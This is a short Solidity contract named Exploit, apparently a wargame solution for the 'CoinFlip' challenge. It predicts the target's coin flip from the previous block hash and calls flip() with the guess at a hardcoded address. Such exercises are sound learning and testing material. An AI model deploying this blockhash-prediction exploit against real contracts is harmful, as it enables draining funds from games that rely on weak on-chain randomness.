pragma solidity >=0.6.0;

import './CoinFlip.sol';
import '@openzeppelin/contracts/utils/math/SafeMath.sol';


contract Exploit {

 using SafeMath for uint256;

    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip c;

    constructor() {
      c = CoinFlip(0x4EC3A55abDa30E00F97eF376a8ABd98fE97DBD44);
    }

    function exploit() public {
        uint256 predictedValue = uint256(blockhash(block.number.sub(1)));
        predictedValue = predictedValue.div(factor);
        bool res;
        if(predictedValue == 1) {
          res = c.flip(true);
        }
        
        else {
          res = c.flip(false);
        }
    }
}

